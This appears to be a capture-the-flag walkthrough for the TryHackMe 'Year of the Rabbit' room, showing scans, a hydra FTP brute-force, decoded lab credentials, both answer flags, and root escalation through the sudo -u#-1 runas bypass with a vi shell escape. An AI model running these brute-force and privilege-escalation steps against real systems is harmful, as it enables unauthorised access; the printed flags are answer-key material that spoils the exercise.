### Time to enter the warren...
Room: https://tryhackme.com/room/yearoftherabbit
##
**sudo nmap** -sS -sV -T5 -vv xx.xx.xxx.xx
```
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.2
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 6.7p1 Debian 5 (protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.10 ((Debian))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

**gobuster** dir -u http://xx.xx.xxx.xx  --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 100 
```
/assets               (Status: 301) [Size: 313] [--> http://xx.xx.xxx.xx/assets/]
```

**from style.css**
```
  /* Nice to see someone checking the stylesheets.
     Take a look at the page: /sup3r_s3cr3t_fl4g.php
  */
```
It tells us to turn off Javascript.  
After doing that, we get a hint in the video that we're looking in the wrong place.  

By intercepting the requests, we can see that there's a **/intermediary.php/hidden_directory=/WExYY2Cv-qU** section of the link in Burp Suite.  
At the **http://xx.xx.xxx.xx/WExYY2Cv-qU/** we find only a photo called Hot_Babe.  

However, by downloading it, the content of **strings** gives us valuable information.   
```
Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:
Mou+56n%QK8sr
1618B0AUshw1M
A56IpIl%1s02u
vTFbDzX9&Nmu?
FfF~sfu^UQZmT
8FF?iKO27b~V0
ua4W~2-@y7dE$
3j39aMQQ7xFXT
Wb4--CTc4ww*-
u6oY9?nHv84D&
0iBp4W69Gr_Yf
TS*%miyPsGV54
C77O3FIy0c0sd
O14xEhgg0Hxz1
5dpv#Pr$wqH7F
1G8Ucoce1+gS5
0plnI%f0~Jw71
0kLoLzfhqq8u&
kS9pn5yiFGj6d
zeff4#!b5Ib_n
rNT4E4SHDGBkl
KKH5zy23+S0@B
3r6PHtM4NzJjE
gm0!!EC1A0I2?
HPHr!j00RaDEi
7N+J9BYSp4uaY
PYKt-ebvtmWoC
3TN%cD_E6zm*s
eo?@c!ly3&=0Z
nR8&FXz$ZPelN
eE4Mu53UkKHx#
86?004F9!o49d
SNGY0JjA5@0EE
trm64++JZ7R6E
3zJuGL~8KmiK^
CR-ItthsH%9du
yP9kft386bB8G
A-*eE3L@!4W5o
GoM^$82l&GA5D
1t$4$g$I+V_BH
0XxpTd90Vt8OL
j0CN?Z#8Bp69_
G#h~9@5E5QA5l
DRWNM7auXF7@j
Fw!if_=kk7Oqz
92d5r$uyw!vaE
c-AA7a2u!W2*?
zy8z3kBi#2e36
J5%2Hn+7I6QLt
gL$2fmgnq8vI*
Etb?i?Kj4R=QM
7CabD7kwY7=ri
4uaIRX~-cY6K4
kY1oxscv4EB2d
k32?3^x1ex7#o
ep4IPQ_=ku@V8
tQxFJ909rd1y2
5L6kpPR5E2Msn
65NX66Wv~oFP2
LRAQ@zcBphn!1
V4bt3*58Z32Xe
ki^t!+uqB?DyI
5iez1wGXKfPKQ
nJ90XzX&AnF5v
7EiMd5!r%=18c
wYyx6Eq-T^9#@
yT2o$2exo~UdW
ZuI-8!JyI6iRS
PTKM6RsLWZ1&^
3O$oC~%XUlRO@
KW3fjzWpUGHSW
nTzl5f=9eS&*W
WS9x0ZF=x1%8z
Sr4*E4NT5fOhS
hLR3xQV*gHYuC
4P3QgF5kflszS
NIZ2D%d58*v@R
0rJ7p%6Axm05K
94rU30Zx45z5c
Vi^Qf+u%0*q_S
1Fvdp&bNl3#&l
zLH%Ot0Bw&c%9
```

**sudo hydra** -l ftpuser -P passlst.txt xx.xx.xxx.xx ftp
> 5iez1wGXKfPKQ

By connection to the FTP, we can find Eli's credentials in Brainfuck format.  
```                                                                                    2 ⚙
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
+++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
<]>+. <+++[ ->--- <]>-- ---.- ----. <
```

After decoding, we find the following credentials.   
```
User: eli
Password: DSpDiM1wAEwid
```

After we log in, we find out the following message.  
```
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE

```

**find** / -name s3cr3t
```
/usr/games/s3cr3t
```
**cat** .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly\! 
```
Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!

Yours sincerely
   -Root
```

**First flag is located at /home/gwendoline/user.txt and is THM{1107174691af9ff3681d2b5bdb5740b1589bae53}** **[1]**.  

**sudo** -l  
```
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```
We can abuse this by opening the user.txt file with vi, then use it to read from another file.  
**sudo** -u#-1 /usr/bin/vi /home/gwendoline/user.txt  

Then, after vi opens, press escape and write :!cat /root/root.txt  
**The second and final flag is at /root/root.txt and is THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}** **[2]**.  
